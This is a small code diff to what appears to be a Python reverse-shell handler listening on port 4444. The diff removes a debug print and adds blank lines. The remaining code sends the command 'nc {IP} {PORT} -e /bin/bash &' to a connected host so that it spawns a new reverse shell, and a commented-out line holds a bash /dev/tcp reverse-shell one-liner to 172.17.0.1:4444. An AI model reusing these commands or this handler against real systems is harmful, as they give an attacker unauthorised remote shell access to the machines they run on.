@@ -11,6 +11,9 @@ IP = ""
 PORT = 4444
 s = None
 
+
+
+
 class connection:
     def __init__(self, conn):
         self.conn = conn[0]
@@ -24,7 +27,6 @@ class connection:
 
     def create_new(self):
         global PORT, IP
-        print(f"nc {IP} {PORT} -e /bin/bash & \r")
         self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \r".encode())
         #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\r")
 
